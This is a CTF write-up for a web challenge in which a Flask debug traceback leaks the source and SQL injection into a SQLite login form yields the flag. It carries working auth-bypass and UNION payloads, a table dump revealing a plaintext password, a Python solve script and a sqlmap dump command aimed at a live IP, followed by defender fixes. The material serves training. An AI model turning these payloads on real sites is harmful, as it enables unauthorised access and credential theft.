# At the Limit — CTF Writeup

**Category:** Web (SQL Injection + Werkzeug Debug Mode Information Disclosure)
**Points:** 200
**Target:** `http://54.72.82.22:8060`
**Flag:** `safctf{30f33ad5be8abc02f034b5b266ff6b81}`

---

## 1. Challenge Description

> **At the Limit** — 200 pts
> *Every day brings a new way to test your patience. Find the edge.*
> Connect to the challenge web service: `http://54.72.82.22:8060`

**Hint interpretation:**

| Phrase | Meaning |
| --- | --- |
| "**At the Limit**" | The SQL **`LIMIT`** clause — the intended payload shape. |
| "test your patience" | You must *walk* the result set one row at a time; the first rows are decoys. |
| "**Find the edge**" | Go to the edge of the result set (`LIMIT … OFFSET n`) until you reach the admin row. |
| "Every day brings a new way" | The login is the attack surface — the query is built unsafely. |

The landing page is themed **POLE POSITION / Motorsport** with a *"Paddock access"* login form.

---

## 2. Recon

### 2.1 Fingerprint

```bash
curl -s -i http://54.72.82.22:8060/
```

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.11.16
Content-Type: text/html; charset=utf-8
Content-Length: 4854
```

**Werkzeug / Flask on Python 3.11.** The body is a themed login page:

```html
<h2>Paddock access</h2>
<form method='post'>
    Username: <input name='username'><br>
    Password: <input name='password' type='password'><br>
    <input type='submit' value='Login'>
</form>
<p></p>
```

### 2.2 Route enumeration

```bash
for p in /admin /flag /dashboard /login /api /status /limit /console /race /lap; do
  printf "%-14s " "$p"; curl -s -m 8 -o /dev/null -w "%{http_code}\n" "http://54.72.82.22:8060$p"
done
```

```
/admin         404
/flag          404
...
/console       400   <-- interesting: not 404
```

`/console` returning **400** rather than 404 is the signature of the **Werkzeug interactive debugger**
being present but refusing a bare request. Worth remembering.

### 2.3 No rate limiting

40 rapid POSTs all behaved identically — despite the "test your patience" phrasing, there is **no**
lockout or throttle:

```
  1  <p>Login failed!</p>  200
 40  <p>Login failed!</p>  200
```

So "patience" is a *story* hint (walk the rows), not a *rate-limit* mechanic.

### 2.4 The method table gives it away

```bash
for m in GET POST PUT DELETE OPTIONS HEAD; do
  printf "%-8s " "$m"; curl -s -m 8 -o /dev/null -w "%{http_code} %{size_download}\n" -X $m "http://54.72.82.22:8060/"
done
```

```
GET      200 4854
POST     500 16589     <-- 16.5 KB error page!
```

A **`POST` with no body** returns a **500 with a 16.5 KB body** — that is a full **Werkzeug debugger
traceback page**. Debug mode is enabled in production.

---

## 3. Step 1 — Leak the Source via the Debugger Traceback

Posting with **no form fields** makes `request.form['username']` raise `BadRequestKeyError`, and
Flask renders the interactive traceback — which includes the **application source around the
failing line**.

```bash
curl -s -X POST http://54.72.82.22:8060/ -o dbg.html
# -> HTTP 500, 16589 bytes
```

Stripping the HTML out of the traceback reveals `/app/app.py`:

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    result = ''
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        ...
```

**There is the bug, in one line:**

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

Both fields are interpolated straight into the SQL string. No parameterisation, no escaping.

> **Note:** the traceback is also the reason we know the backend is **SQLite** (`sqlite3.connect`),
> which tells us the dialect for `UNION SELECT`, `pragma_table_info`, `sqlite_master`, and the `||`
> string-concatenation operator.

### 3.1 The response format

The app renders two columns of the returned row:

```
Welcome back user <row[0]>, <row[1]>
```

That "display only columns 0 and 1" detail matters later — anything you want to read must be placed
in the **first or second** UNION column.

---

## 4. Step 2 — Confirm SQL Injection

Classic login bypass — comment out the password check:

| `username` | `password` | Result |
| --- | --- | --- |
| `admin` | `admin` | `Login failed!` |
| **`admin' -- `** | `x` | **`Welcome back user admin, safctf{30f33ad5be8abc02f034b5b266ff6b81}`** |
| `' OR '1'='1` | `' OR '1'='1` | `Welcome back user test, Flag at admin user` |

The second payload returns the **first** row in the table — `test`, whose `display_name` is a taunt:
*"Flag at admin user"*. We need to reach the **admin** row.

Injected, the query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'x'
```

Everything after `--` is a comment, so only `username = 'admin'` is evaluated and the admin row is
returned — flag included.

---

## 5. Step 3 — Enumerate with UNION

### 5.1 Column count

SQLite requires the `UNION` arms to have matching column counts, so this doubles as a column-count
oracle:

| Payload | Response |
| --- | --- |
| `' UNION SELECT 1,2 -- ` | `That request could not be completed.` (2 cols ≠ table) |
| `' UNION SELECT 1,2,3 -- ` | `Welcome back user 1, 2` → **3 columns** |
| `' UNION SELECT 1,2,3,4 -- ` | `That request could not be completed.` |

### 5.2 Schema

```sql
' UNION SELECT group_concat(name),'x',3 FROM sqlite_master WHERE type='table' --
' UNION SELECT sql,'x',3 FROM sqlite_master WHERE name='users' --
```

```
CREATE TABLE users (username TEXT, display_name TEXT, password TEXT)
```

### 5.3 All rows

```sql
' UNION SELECT username||' | '||display_name||' | '||password, 'x', 'x' FROM users LIMIT 1 OFFSET n --
```

| # | username | display_name | password |
| --- | --- | --- | --- |
| 0 | **admin** | **`safctf{30f33ad5be8abc02f034b5b266ff6b81}`** | `super_strong_unguessable_wacha_tu!` |
| 1 | guest | Flag at admin user | guest |
| 2 | test | Flag at admin user | test |

The flag lives in the `admin` row's **`display_name`** column — which is exactly what the app prints
after `Welcome back user …, `.

---

## 6. Step 4 — The Themed Solve (`LIMIT` / `OFFSET`)

The intended path, matching the challenge name: the naive `' OR 1=1` lands on row 0 of the natural
ordering (`guest`/`test` decoys). You **walk to the edge** of the result set with `LIMIT`/`OFFSET`
until the admin row falls out:

```bash
curl -s -X POST http://54.72.82.22:8060/ \
  --data-urlencode "username=' OR 1=1 LIMIT 1 OFFSET 2 -- " \
  --data-urlencode "password=x"
```

```sql
SELECT * FROM users WHERE username = '' OR 1=1 LIMIT 1 OFFSET 2 -- ' AND password = 'x'
```

```
Welcome back user admin, safctf{30f33ad5be8abc02f034b5b266ff6b81}
```

### ✅ Flag

```
safctf{30f33ad5be8abc02f034b5b266ff6b81}
```

**One-shot (shortest path):**

```bash
curl -s -X POST http://54.72.82.22:8060/ \
  --data-urlencode "username=admin' -- " --data-urlencode "password=x" \
  | grep -oE 'safctf\{[^}]+\}'
```

**Alternative — just log in with the recovered credential:**

```bash
curl -s -X POST http://54.72.82.22:8060/ \
  --data-urlencode "username=admin" \
  --data-urlencode "password=super_strong_unguessable_wacha_tu!"
```

> The password is strong (`super_strong_unguessable_wacha_tu!`) and would never be brute-forced —
> but SQL injection hands it over anyway. **"Unguessable" is not the same as "protected".**

---

## 7. Kill Chain Summary

```
http://54.72.82.22:8060/            themed login ("Paddock access")
        │
        │  POST with NO body  →  HTTP 500, 16.5 KB
        ▼
Werkzeug debugger traceback  →  leaks /app/app.py source:
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        │
        ▼
SQL injection (string concatenation, no parameterisation)
        │
        ├─ ' UNION SELECT 1,2,3 --                  → 3 columns confirmed
        ├─ ' UNION SELECT sql,'x',3 FROM sqlite_master WHERE name='users' --
        │                                           → users(username, display_name, password)
        ├─ ' UNION SELECT username||' | '||password…  → admin / super_strong_unguessable_wacha_tu!
        ▼
' OR 1=1 LIMIT 1 OFFSET 2 --    → "find the edge" → admin row
        │
        ▼
Welcome back user admin, safctf{30f33ad5be8abc02f034b5b266ff6b81}
```

---

## 8. Full Solve Script

```python
#!/usr/bin/env python3
# At the Limit — full solve
import re, urllib.parse, urllib.request

B = "http://54.72.82.22:8060"

def post(username, password="x"):
    data = urllib.parse.urlencode({"username": username, "password": password}).encode()
    with urllib.request.urlopen(urllib.request.Request(B + "/", data=data)) as r:
        return r.read().decode("utf-8", "replace")

def show(username, password="x"):
    body = re.sub(r"<[^>]+>", " ", post(username, password))
    body = re.sub(r"\s+", " ", body)
    i = body.find("Paddock access")
    return body[i:].strip()

# --- 0. confirm debug mode / leak source ---
try:
    urllib.request.urlopen(urllib.request.Request(B + "/", data=b""))
except urllib.error.HTTPError as e:
    trace = e.read().decode("utf-8", "replace")
    print("[*] debug traceback leaked:", len(trace), "bytes")

# --- 1. schema ---
print("[*] schema :", show("' UNION SELECT sql,'x',3 FROM sqlite_master WHERE name='users' -- "))

# --- 2. walk the result set to its edge (the themed solve) ---
for off in range(0, 6):
    r = show(f"' OR 1=1 LIMIT 1 OFFSET {off} -- ")
    print(f"[*] OFFSET {off}: {r}")
    m = re.search(r"safctf\{[^}]+\}", r)
    if m:
        print("\n[+] FLAG:", m.group(0))
        break
```

**Bash one-liner:**

```bash
curl -s -X POST http://54.72.82.22:8060/ \
  --data-urlencode "username=admin' -- " --data-urlencode "password=x" | grep -oE 'safctf\{[^}]+\}'
```

**With sqlmap (fully automatic):**

```bash
sqlmap -u "http://54.72.82.22:8060/" \
  --data="username=admin&password=x" --method=POST \
  --dbms=sqlite --technique=U --dump --batch
```

---

## 9. Tools & Techniques

| Tool | Purpose |
| --- | --- |
| `curl -X POST` (empty body) | Triggering the debug traceback deliberately |
| `curl -X <method>` sweep | Spotting the 500-on-POST anomaly that exposed debug mode |
| Python `re` + `html.unescape` | Turning the traceback HTML into readable source |
| `--data-urlencode` | Delivering SQL metacharacters (`'`, `--`, `\|`) intact |
| `UNION SELECT` column oracle | Determining the table's column count |
| `sqlite_master` / `pragma_table_info` | Schema and column-name extraction |
| `\|\|` (SQLite concat) | Packing multiple columns into the two displayed positions |
| `LIMIT … OFFSET` | The themed "find the edge" walk |
| `sqlmap` | Automated confirmation/dump |
| HexStrike MCP / BlackBook MCP | Offensive orchestration + technique grounding |

### Techniques

1. **Debug-mode information disclosure** — an unhandled exception in a Flask app with `debug=True`
   renders a traceback that includes **application source code**. A single empty POST was enough to
   read `/app/app.py`.
2. **Response-size anomaly detection** — 4854 vs 16589 bytes on the same endpoint is a loud signal.
3. **SQL injection via string concatenation** — both `username` and `password` are interpolated into
   the query.
4. **Comment-based auth bypass** — `admin' -- ` drops the password predicate entirely.
5. **UNION-based enumeration** — column-count oracle → schema → full table dump.
6. **Display-limited exfiltration** — when only columns 0 and 1 are echoed, use `||` to concatenate
   the data you want into those positions.
7. **`LIMIT`/`OFFSET` walking** — iterating the result set to reach a row the app would never show
   first ("find the edge").

---

## 10. Defender Takeaways

- **Never build SQL by string concatenation.** This is the entire vulnerability:

  ```python
  # VULNERABLE
  query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

  # FIXED — parameterised query; input can never change the SQL structure
  c.execute(
      "SELECT * FROM users WHERE username = ? AND password = ?",
      (username, password),
  )
  ```

  If you need dynamic identifiers (table/column names), use a **strict allow-list**, never
  interpolation.

- **Never run with `debug=True` in production.** The Werkzeug debugger hands out source code,
  environment details, and — if the PIN is weak or reachable — **arbitrary code execution** via the
  console at `/console`. Disable it, and make sure exceptions return a generic 500 page.

  ```python
  app.run(host="0.0.0.0", port=5000, debug=False)
  ```

- **Never store secrets in a user-visible column.** The flag was sitting in `display_name`, which the
  app helpfully printed on every successful login. Data that is *readable by the app* is *disclosable
  by an injection*.

- **Don't rely on password strength to protect a row.** `super_strong_unguessable_wacha_tu!` was
  perfectly strong and completely irrelevant — the injection never needed to guess it.

- **Least privilege for the DB user.** The app's SQLite connection could read every table; a
  restricted, per-purpose account (and no `sqlite_master`/`pragma` exposure in production paths)
  limits what an injection can reach.

- **Hash passwords; never store or compare them in plaintext** — and never return them in a query
  whose results reach the template.
